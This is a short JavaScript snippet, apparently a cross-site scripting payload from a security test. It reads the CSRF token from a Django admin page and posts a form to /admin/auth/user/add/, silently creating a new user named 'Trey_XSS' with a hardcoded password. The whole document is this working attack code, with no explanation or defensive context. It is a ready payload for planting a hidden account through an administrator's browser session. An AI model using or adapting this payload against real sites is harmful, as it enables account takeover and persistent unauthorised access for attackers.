const token = document.querySelector('input[name=csrfmiddlewaretoken]').value;
fetch("/admin/auth/user/add/", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: `csrfmiddlewaretoken=${encodeURIComponent(token)}&email=trey%2Bxss%40inspectiv.com&username=Trey_XSS&password1=Medbajjer0808**&password2=Medbajjer0808**&_save=Save`
});
